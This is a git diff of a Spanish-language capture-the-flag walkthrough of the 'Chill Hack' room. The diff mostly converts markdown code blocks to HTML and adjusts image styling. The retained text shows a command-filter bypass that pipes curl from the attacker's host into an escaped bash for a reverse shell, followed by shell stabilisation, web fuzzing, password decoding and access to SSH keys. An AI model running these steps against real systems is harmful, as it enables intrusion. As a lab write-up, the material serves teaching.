@@ -76,9 +76,9 @@ Hemos hecho un bypass del comando `ls -la` escapando la s, por lo que podemos ll
       <img src="../assets/images/Rooms/ChillHack/image 10_1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px">
       </div>
     </td>
-    <td style="vertical-align:top; width:55%">
+    <td style="vertical-align:top;">
       <div style="text-align:center;">
-        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)">
+        <img src="../assets/images/Rooms/ChillHack/image 10_2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px>
       </div>
     </td>
   </tr>
@@ -93,24 +93,24 @@ Por lo que, podemos intentar ejecutar una <em>reverse shell</em> desde la págin
 Ahora, en la web vamos a ejecutar el comando:
 <div style="text-align:center;">
 
-```bash
-curl http://ip_nuestra/nombre_shell | ba\sh 
-```
+<div style="text-align: center;">
+  <pre><code>curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
+</div>
 
 </div>
 para poder obtener la *reverse shell* y seguido ejecutarla escapando el comando `bash`.
 
 <table style="text-align:center">
   <tr>
-    <td style="vertical-align:top; width:50%">
-      <div style="text-align: center;">
-        <img src="../assets/images/Rooms/ChillHack/image 13.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px">
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 13.png" alt="Untitled" onclick="openModal(this.src)">
       </div>
       Como resultado, tenemos que al escuchar y ejecutar la shell, estamos dentro del servidor.
     </td>
-    <td style="vertical-align:top; width:50% ">
-      <div style="text-align:center;">
-        <img src="../assets/images/Rooms/ChillHack/image 14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:290px">
+    <td style="vertical-align:top;">
+      <div>
+        <img src="../assets/images/Rooms/ChillHack/image 14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px">
       </div>
     </td>
   </tr>
@@ -139,14 +139,13 @@ Si ejecutamos el comando especificando el usuario `-u apaar` y en el mensaje esc
     </td>
     <td style="vertical-align:top; width:50% ">
       Tratamiento de la tty (para poder tener una CLI más amigable):
-
-  ```bash
-  python3 -c 'import pty; pty.spawn("/bin/bash")'
-  (ctrl + Z)
-  stty raw -echo;fg
-  stty rows 29 columns 126
-  export TERM=screen
-  ```
+    <div style="text-align: left;">
+      <pre><code>  python3 -c 'import pty; pty.spawn("/bin/bash")'
+      (ctrl + Z)
+      stty raw -echo;fg
+      stty rows 29 columns 126
+      export TERM=screen</code></pre>
+    </div>
   </td>
   </tr>
 </table>
@@ -180,10 +179,7 @@ Encontramos un panel de login, que puede cuadrar con el servicio *SSH* que hay c
 
 Pero primero, vamos a volver a hacer *fuzzing web* a esta web:
 <div style="text-align:center;">
-
-```bash
-gobuster dir -u ip_maquina:9001 -w /ruta_wordlist
-```
+<pre><code>gobuster dir -u ip_maquina:9001 -w /ruta_wordlist</code></pre>
 </div>
 
 y vemos que tenemos un directorio llamado `/images`, si accedemos a él encontramos dos archivos, el que nos interesa es el '.jpg'.
@@ -208,12 +204,9 @@ Y esto no da un archivo llamado 'backup.zip', el cual si queremos descomprimir n
 </div>
 Tenemos la contraseña del '.zip', vamos a abrirlo:
 <div style="text-align:center;">
-
-```bash
-unzip backup.zip
+<pre><code>unzip backup.zip
 nano source_code.php
-```
-
+</code></pre>
 </div>
 
 <div style="text-align:center;">
@@ -222,21 +215,13 @@ nano source_code.php
 
 Encontramos la contraseña del otro usuario <strong>Anurodh</strong>, la cual está encriptada en base64, la desencriptamos y nos la guardamos:
 <div style="text-align: center;">
-
-```bash
-echo -e "contraseña_base64" | base64 -d
-```
-
+<pre><code>echo -e "contraseña_base64" | base64 -d</code></pre>
 </div>
 
 Ahora sí, vamos a proceder a obtener las claves *id_rsa* del usuario <strong>apaar</strong>, para ello vamos al directorio donde estas se almacenan:
 
 <div style="text-align: center;">
-
-```bash
-cd /home/apaar/.shh
-```
-
+<pre><code> cd /home/apaar/.shh</code></pre>
 </div>
 
 <div style="text-align:center;">
